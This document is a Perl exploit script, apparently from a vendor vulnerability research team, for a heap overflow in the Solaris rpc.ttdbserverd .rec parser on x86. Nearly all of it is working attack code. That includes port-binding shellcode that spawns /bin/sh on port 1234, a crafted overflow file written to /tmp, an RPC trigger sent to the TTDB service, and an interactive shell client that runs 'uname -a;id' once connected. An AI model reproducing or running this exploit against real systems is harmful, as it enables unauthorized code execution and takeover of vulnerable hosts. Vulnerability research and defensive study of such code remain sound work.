##########################################################################
# Check Point Software Technologies - Vulnerability Discovery Team (VDT) #
# Rodrigo Rubira Branco - <rbranco *noSPAM* checkpoint.com>		 #
#									 #
# RPC TTDB .rec parser Heap Overflow					 #
#									 #	
# thr_jmp_table does not exist on Solaris 10 u8 			 #
# See the SPARC version of this exploit to see how to specify other 	 #
# addresses to be overwritten						 #
##########################################################################

use POSIX;
use IO::Socket;
use IO::Select;

$shellrise = #portbind 1234
    "\x68\xff\xd8\xff\x3c".#  /*  pushl   $0x3cffd8ff               */
    "\x6a\x65".#              /*  pushl   $0x65                     */
    "\x89\xe6".#              /*  movl    %esp,%esi                 */
    "\xf7\x56\x04".#          /*  notl    0x04(%esi)                */
    "\xf6\x16".#              /*  notb    (%esi)                    */
    "\x31\xc0".#              /*  xorl    %eax,%eax                 */
    "\x50".#                  /*  pushl   %eax                      */
    "\x68\xff\x02\x04\xd2".#  /*  pushl   $0xd20402ff               */
    "\x89\xe7".#              /*  movl    %esp,%edi                 */
    "\x6a\x02".#              /*  pushl   $0x02                     */
    "\x50".#                  /*  pushl   %eax                      */
    "\x50".#                  /*  pushl   %eax                      */
    "\x6a\x02".#              /*  pushl   $0x02                     */
    "\x6a\x02".#              /*  pushl   $0x02                     */
    "\xb0\xe6".#              /*  movb    $0xe6,%al                 */
    "\xff\xd6".#              /*  call    *%esi                     */
    "\x6a\x10".#              /*  pushl   $0x10                     */
    "\x57".#                  /*  pushl   %edi                      */
    "\x50".#                  /*  pushl   %eax                      */
    "\x31\xc0".#              /*  xorl    %eax,%eax                 */
    "\xb0\xe8".#              /*  movb    $0xe8,%al                 */
    "\xff\xd6".#              /*  call    *%esi                     */
    "\x5b".#                  /*  popl    %ebx                      */
    "\x50".#                  /*  pushl   %eax                      */
    "\x50".#                  /*  pushl   %eax                      */
    "\x53".#                  /*  pushl   %ebx                      */
    "\xb0\xe9".#              /*  movb    $0xe9,%al                 */
    "\xff\xd6".#              /*  call    *%esi                     */
    "\xb0\xea".#              /*  movb    $0xea,%al                 */
    "\xff\xd6".#              /*  call    *%esi                     */
    "\x6a\x09".#              /*  pushl   $0x09                     */
    "\x50".#                  /*  pushl   %eax                      */
    "\x6a\x3e".#              /*  pushl   $0x3e                     */
    "\x58".#                  /*  popl    %eax                      */
    "\xff\xd6".#              /*  call    *%esi                     */
    "\xff\x4f\xd8".#          /*  decl    -0x28(%edi)               */
    "\x79\xf6".#              /*  jns     <bndsockcode+61>          */
    "\x50".#                  /*  pushl   %eax                      */
    "\x68\x2f\x2f\x73\x68".#  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e".#  /*  pushl   $0x6e69622f               */
    "\x89\xe3".#              /*  movl    %esp,%ebx                 */
    "\x50".#                  /*  pushl   %eax                      */
    "\x53".#                  /*  pushl   %ebx                      */
    "\x89\xe1".#              /*  movl    %esp,%ecx                 */
    "\x50".#                  /*  pushl   %eax                      */
    "\x51".#                  /*  pushl   %ecx                      */
    "\x53".#                  /*  pushl   %ebx                      */
    "\xb0\x3b".#              /*  movb    $0x3b,%al                 */
    "\xff\xd6";#              /*  call    *%esi                     */


$heap = 0x08047c14; # Where to write. Solaris 9 x86 update 8
$frst = pack('n',(($heap & 0xffff0000) >> 16));
$scnd = pack('n',($heap & 0x0000ffff));

$stck = 0x08047644; # Shellcode Address
$sfrst = pack('n',(($stck & 0xffff0000) >> 16));
$sscnd = pack('n',($stck & 0x0000ffff)); 

$file = "/tmp/owned";

print STDERR "-= rpc.ttdbserverd .rec parser exploit for Solaris 9/10 x86 =-\n";
print STDERR "-= Check Point Software Technologies - Vulnerability Discovery Team (VDT) =-\n";
print STDERR "-= Rodrigo Rubira Branco <rbranco *noSPAM* checkpoint.com> =-\n\n";

$rpcdata =
"\x80\x00\x00\x98\x19\x38\xba\x51\x00\x00\x00\x00\x00\x00".
"\x00\x02\x00\x01\x86\xf3\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00".
"\x00\x01\x00\x00\x00\x20\x4b\x3b\x63\x40\x00\x00\x00\x09\x6c\x6f".
"\x63\x61\x6c\x68\x6f\x73\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
pack('N',length($file)) .
$file.
"\x00\x00\x00\x00\x00". 
"\x00\x04\x31\x32\x33\x34\x00\x00\x00\x00\x00\x04\x35\x36\x37\x38".
"\x00\x00\x00\x00\x00\x04\x39\x40\x41\x42\x00\x00\x00\x00\x00\x04".
"\x43\x44\x45\x46\x00\x00\x00\x00\x00\x04\x47\x48\x49\x50\x00\x00".
"\x00\x00\x00\x04\x51\x52\x53\x54\x00\x00\x00\x04\x55\x56\x57\x58";

$pkt =
"\x4E\x65\x74\x49\x53\x41\x4D\x00\x55\x6E\x6B\x6E\x6F\x77\x6E\x00".
"\x31\x2E\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x04\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x03\x00\x1C\x00\x1C\x00\x00\x00\x00\x00\x03\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04".
"\xFF\xFF\xFF\xFF\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x41\x41\x41\x41".
"A" x 80 .
"\xff\xff\x00\x00".
"\x00\x00\x00\x00".
"1234".
$sscnd . $sfrst.
"\xff\xff\xff\xff".
"\xff\xff\xff\xff".
"\x00\x00\x00\x02".
"\x00\x00\x00\x00".
"aaaa".
$scnd . $frst.
"bbbbbb".
"\x90" x 504 . "\xeb\x50" . "\x90" x 102 . $shellrise . 
"\x90" x (3300 - length($shellrise) - 608); 

open(F,">/tmp/owned.rec") or die("Cant create file on /tmp");
print STDERR "[+] Creating file " . $file . ".rec\n";
print F $pkt;
close(F);

$target_host = "localhost";
$port = rpc_getport($target_host, 111, 100083, 1);
if(!$port){ die ("[-] TTDB not running on target!\n");}

print STDERR "[+] TTDB running on port $port\n";


$sock = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$target_host,PeerPort=>$port)
or die "[-] Cant Connect!!\n";

print STDERR "[+] Sending stuff to TTDB ...";
print $sock $rpcdata;
print STDERR "d0ne!\n";

close($sock);

print STDERR "[+] Wait a little!\n";
sleep(2);

 $sc = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$target_host,PeerPort=>1234,Type=>SOCK_STREAM,Reuse=>1)
  or die "[*] No luck :(\n\n";

  print "[*] We got in =)\n";

  $sc->autoflush(1);

  sleep(2);

  print $sc "echo;uname -a;id;echo\n";

  die "cant fork: $!" unless defined($pid = fork());

  if ($pid) {
      while(defined ($line = <$sc>)) {
          print STDOUT $line;
      }
      kill("TERM", $pid);
  }
  else
  {
      while(defined ($line = <STDIN>)) {
          print $sc $line;
      }
  }
  close($sc);
  print "Good bye!!\n";



sub rpc_getport {
    my ($target_host, $target_port, $prog, $vers) = @_;

    my $s = rpc_socket($target_host, $target_port);

    my $portmap_req =

        pack("L", rand() * 0xffffffff) . # XID
        "\x00\x00\x00\x00".              # Call
        "\x00\x00\x00\x02".              # RPC Version
        "\x00\x01\x86\xa0".              # Program Number  (PORTMAP)
        "\x00\x00\x00\x02".              # Program Version (2)
        "\x00\x00\x00\x03".              # Procedure (getport)
        ("\x00" x 16).                   # Credentials and Verifier
        pack("N", $prog) .
        pack("N", $vers).
        pack("N", 0x6).                  # Protocol: TCP 
        pack("N", 0x00);                 # Port: 0

    print $s $portmap_req;

    my $r = rpc_read($s);
    close ($s);

    if (length($r) == 28)
    {
        my $prog_port = unpack("N",substr($r, 24, 4));
        return($prog_port);
    }

    return undef;
}

sub rpc_socket {
    my ($target_host, $target_port) = @_;
    my $s = IO::Socket::INET->new
    (
        PeerAddr => $target_host,
        PeerPort => $target_port,
        Proto    => "udp",
        Type     => SOCK_DGRAM
    );

    if (! $s)
    {
        print "\nError: could not create socket to target: $!\n";
        exit(0);
    }

    select($s); $|++;
    select(STDOUT); $|++;
    nonblock($s);
    return($s);
}

sub rpc_read {
    my ($s) = @_;
    my $sel = IO::Select->new($s);
    my $res;
    my @fds = $sel->can_read(4);
    foreach (@fds) { $res .= <$s>; }
    return $res;
}

sub nonblock {
    my ($fd) = @_;
    my $flags = fcntl($fd, F_GETFL,0);
    fcntl($fd, F_SETFL, $flags|O_NONBLOCK);
}

sub hexdump
{
        my ($buf) = @_;
        my ($p, $c, $pc, $str);
        my ($i);

        for ($i=0;$i<length($buf);$i++)
        {
                $p = substr($buf, $i, 1);
                $c = ord ($p);
                printf "%.2x ", $c;
                $pc++;
                if (($c > 31) && ($c < 127))
                {
                        $str .= $p;
                }
                else
                {
                        $str .= ".";
                }
                if ($pc == 16)
                {
                        print " $str\n";
                        undef $str;
                        $pc = 0;
                }
        }
        print "   " x (16 - $pc);
        print " $str \n";
}